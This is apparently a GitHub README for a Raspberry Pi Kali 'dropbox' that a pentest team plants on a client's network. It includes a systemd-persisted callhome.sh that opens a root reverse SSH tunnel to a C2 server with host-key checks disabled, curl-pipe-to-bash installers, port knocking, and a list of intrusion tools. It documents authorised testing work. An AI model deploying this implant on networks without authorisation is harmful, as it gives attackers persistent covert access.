# C.R.E.A.M.pi - Raspberry pi kali dropbox
---
 **C.R.E.A.M.pi** is short for (Cyber Reconnaissance and Exploitation Analysis Module Pi) is a Raspberry pi 4B is a pentest dropbox which will be shipped to the customer / client. C.R.E.A.M.pi will either connect from an ethernet port where it is connected from the client's network (in band connection) or over a portable Wifi network (out of band connection). C.R.E.A.M.pi will automatically connect to the server hosted on the cloud which we control.

---
```
  
 ▄████▄        ██▀███       ▓█████       ▄▄▄            ███▄ ▄███▓      ██▓███   ██▓
▒██▀ ▀█       ▓██ ▒ ██▒     ▓█   ▀      ▒████▄         ▓██▒▀█▀ ██▒     ▓██░  ██▒▓██▒
▒▓█    ▄      ▓██ ░▄█ ▒     ▒███        ▒██  ▀█▄       ▓██    ▓██░     ▓██░ ██▓▒▒██▒
▒▓▓▄ ▄██▒     ▒██▀▀█▄       ▒▓█  ▄      ░██▄▄▄▄██      ▒██    ▒██      ▒██▄█▓▒ ▒░██░
▒ ▓███▀ ░ ██▓ ░██▓ ▒██▒ ██▓ ░▒████▒ ██▓  ▓█   ▓██▒ ██▓ ▒██▒   ░██▒ ██▓ ▒██▒ ░  ░░██░
░ ░▒ ▒  ░ ▒▓▒ ░ ▒▓ ░▒▓░ ▒▓▒ ░░ ▒░ ░ ▒▓▒  ▒▒   ▓▒█░ ▒▓▒ ░ ▒░   ░  ░ ▒▓▒ ▒▓▒░ ░  ░░▓  
  ░  ▒    ░▒    ░▒ ░ ▒░ ░▒   ░ ░  ░ ░▒    ▒   ▒▒ ░ ░▒  ░  ░      ░ ░▒  ░▒ ░      ▒ ░
░         ░     ░░   ░  ░      ░    ░     ░   ▒    ░   ░      ░    ░   ░░        ▒ ░
░ ░        ░     ░       ░     ░  ░  ░        ░  ░  ░         ░     ░            ░  
░          ░             ░           ░              ░               ░     ░             ░           ░              ░
```
---
### Usage / Installation
---
Building kali linux image on the raspberry pi:

Required hardware:
- Raspberry pi 4b and its components
- Ethernet cable w/ Internet connection or USB SD Card reader
- 32gb or more SD Card
- A computer

Required software:
- Balena etcher / Rufus

Note:
 Installation of kali over the internet using ethernet cable can be done if the MicroSD is fresh from the box.
 
---
##### Install kali via MicroSD card

- Download kali image on https://www.kali.org/get-kali/#kali-arm make sure to install the 64bit version on raspberry pi 4b,
- Download balena etcher portable flasher tool https://etcher.balena.io/
- Flash the kali image on the MicroSD card via USB card reader
- Install the SD Card on pi

##### Install kali via Ethernet port
- Format the MicroSD card to FAT32/EXFat if 128gb or higher
- Plug the MicroSD Card on the pi
- On the menu, select Operating system and select *Other general-purpose OS*
- Select Kali Linux (make sure to install 64 bit for raspberry pi 4b)
---
### Post Install setup

Install an openvpn or setup a ssh  local and reverse tunnel to connect the pi over cloud controlled server. There is and issue where the client network can connect over the internet but most of them have outbound firewall rules and external sites whitelisting. Ensure to enable routes if out-of-band connection is going to be used. Connect the pi over the wlan using command line. 

Update and upgrade packages

```sh
apt update -y && apt upgrade -y
```

Connecting pi to wireless network

```sh
nmcli dev wifi connect SSID_NAME password SSID_PASSPHRASE
```

#### Setting up reverse ssh tunnel callback

Create services and timers on ***/etc/systemd/system***

*callhome.service*
```service
[Unit]
Description="C2 Call Home Service"
After=network.target

[Service]
Type=forking
User=root
ExecStart=/opt/scripts/startup/callhome.sh start
Restart=always
RestartSec=5

[Install]
WantedBy=default.target
```

*callhome-persistence.timer*
```timer
[Unit]
Description=C2 Callhome Persistence Service Timer

[Timer]
OnBootSec=15m
OnUnitActiveSec=30s
Unit=callhome.service

[Install]
WantedBy=default.target
```

Callback script on ***/opt/scripts/startup***

*callhome.sh*
```bash
#!/bin/bash
#
# Starts autossh to connect to C2
# this script is managed by callhome.service in /etc/systemd/system
#
#
# Setting Up:
# - generate an rsa key using ssh-keygen
# - upload the private key here in /root/.ssh/                                          # - run chmod 600 on the private key file                                               # - copy the public key to the server, by ssh-copy-id or public key and add it to authorized_keys file of the server.
# - once connected, remote back in to this host using ssh root@127.0.0.1 on the specified tunnel port
#
# SSH reverse tunnel configuration
#
# Below config will connect to the remote server.
# i.e. ssh user@153.231.21.50 -i /root/.ssh/id_rsa and will use the tunnel port to create
# a reverse ssh tunnel to connect back to this host.

# The server which the CREAMpi will connect to
C2_SERVER="192.168.0.123"
# Username that will be used to log in to the remote server
USER="root"
# RSA key file to be used to authenticate to the remote server.
KEY_FILE=/root/.ssh/id_rsa
# Tunnel port to be used in connecting back to this host.
TUN_PORT=2222
# Logging
# the host will try to connect to the remote server time by time. logs are located in
# /var/log/callhome.log to debug, verify the connection.
LOG_DIR=/var/log/callhome.log

# Logging timestamp function
function TIMESTAMP {
  date "+%Y-%m-%d %H:%M:%S"
}

function c2_cleanup {
  echo "[`TIMESTAMP`] Cleaning up process.. " >> $LOG_DIR; sleep 2
  ps aux | grep "ssh -L" | head -n1 | awk '{print $2}' | xargs -I % kill -9 %
}

function c2_callhome {
  echo "[`TIMESTAMP`] Service started.." >> $LOG_DIR ; sleep 2
  echo "[`TIMESTAMP`] Setting up reverse SSH tunnel to specified host ($C2_SERVER)" >> $LOG_DIR
  echo "[`TIMESTAMP`] Connecting to $C2_SERVER using $USER username and keyfile located in $KEY_FILE.." >> $LOG_DIR
  ssh -L $TUN_PORT:127.0.0.1:22 \
          -R $TUN_PORT:127.0.0.1:22 \
          -i $KEY_FILE \
          -N \
          -f \
          -o "PubkeyAuthentication=yes" \
          -o "PasswordAuthentication=no" \
          -o "UserKnownHostsFile=/dev/null" \
          -o "StrictHostKeyChecking=no" \
          $USER@$C2_SERVER
  sleep 2

  CHECK_CON=`netstat -plnt | grep $TUN_PORT | head -n1 | awk {'print $6'}`

  if [[ $CHECK_CON == "LISTEN" ]]; then
    echo "[`TIMESTAMP`] Successfully established reverse ssh tunnel on the remote server ($C2_SERVER).." >> $LOG_DIR
    echo "[`TIMESTAMP`] On the remote server, execute ssh -p $TUN_PORT root@localhost to connect back to $HOSTNAME.."
  else
    echo "[`TIMESTAMP`] ERROR: SSH reverse tunnel failed. Unable to connect to the remote server ($C2_SERVER).." >> $LOG_DIR
  fi
}

function main {
  c2_cleanup
  c2_callhome
}

main
```

Setting up routes for out-of-band connection

```sh
ip route add <IP_of_CLOUD_SERVER/MASK> via <GATEWAY_of_WLAN_INTERFACE> dev <WLAN_INTERFACE>
```

Creating a persistent route using wlan0

```bash
nmcli con mod <SSID_OF_WLAN> +ipv4.routes "<IP_of_CLOUD_SERVER/MASK <GATEWAY_of_WLAN_INTERFACE> <ROUTE_METRIC>"
```

Checking of applied routes

```bash
ip route
```

```bash
route -n
```

Setting up eth0 to managed mode

*/etc/NetworkManager/NetworkManager.conf*
```bash
[main]
plugins=ifupdown,keyfile

# To manage eth0 interface set this to true
# enable the interface:
# `nmcli con up eth0`
[ifupdown]
managed=true
```

```bash
nmcli con up eth0
```

```bash
nmcli con del "Ifupdown (eth0)"
```

Enabling and starting the services

```bash
systemctl enable --now callhome.service \
systemctl enable --now callhome-persistence.timer
```

Disabling auto sleep / hibernate

```sh
systemctl mask sleep.target suspend.target hibernate.target hybrid-sleep.target
```

---

### Post installation configuration fixes

Install LCD (3.5in) - default
```sh
curl -sSf https://raw.githubusercontent.com/offsecph/CREAMpi/master/others/config.sh | bash
```

Ignore LCD install setup 
```sh
curl -sSf https://raw.githubusercontent.com/offsecph/CREAMpi/master/others/config.sh | sed 's/LCD=yes/LCD=no/' | bash
```

(Optional) To revert back to HDMI display

```sh
cd /opt/scripts/hardware/LCD-kali-show && ./LCD-hdmi
```

Stateful firewall is on after executing post install configuration fixes. To access ssh port, knock on the sequence:

```sh
knock <IP_of_CREAMpi> 69 69 69 -d 500
```

To close port:

```sh
knock <IP_of_CREAMpi> 96 96 96 -d 500
```

---

### Optional:

Installing xrdp

```sh
apt install -y xrdp && systemctl enable --now xrdp
```

Setting up x11 forwarding
  Make sure to enable X11 forwarding on sshd_config and restart the ssh service.
  
```sh
apt install -y xauth && cat ~/.Xauthority
```

---
### Post Install - Tools

Install the tools required for the test. "git clone" into */opt/tools/network-tools* directory

- Nessus Pro
- Crackmapexec (https://github.com/byt3bl33d3r/CrackMapExec)
	- Install instruction PIPX (https://www.crackmapexec.wiki/getting-started/installation)
- Impacket toolkit (https://github.com/fortra/impacket)
- Mitm6 (https://github.com/dirkjanm/mitm6)
- Kerbrute (https://github.com/ropnop/kerbrute)
- PowerTools
- Responder (https://github.com/lgandx/Responder)
- SecLists (https://github.com/danielmiessler/SecLists)
- bloodhound-python (https://github.com/dirkjanm/BloodHound.py)
- rusthound (https://github.com/NH-RED-TEAM/RustHound)
- ligolo-ng (https://github.com/nicocha30/ligolo-ng)
- https-server (https://github.com/catx0rr/https-server)

Install the tools required for the test. "git clone" into */opt/tools/physical-tools* directory

- NAC Bypass (https://github.com/scipag/nac_bypass)
- Silent Bridge (https://github.com/s0lst1c3/silentbridge)

Install the tools required for the test. "git clone" into */opt/tools/web-tools* directory

- Nuclei (https://github.com/projectdiscovery/nuclei)
- Nuclei Templates (https://github.com/projectdiscovery/nuclei-templates)
- Katana (https://github.com/projectdiscovery/katana)
- HTTPX (https://github.com/projectdiscovery/httpx)
- Aquatone (https://github.com/michenriksen/aquatone)

---
### Network Scripts

C.R.E.A.M.pi has network scripts on scripts directory on the repository. Place them on ***/opt/***

### Custom ARM64 Kali images for Rpi

See custom rpi image of this setup 

[https://github.com/offsecph/kali_rpi](https://github.com/offsecph/kali_rpi)

---
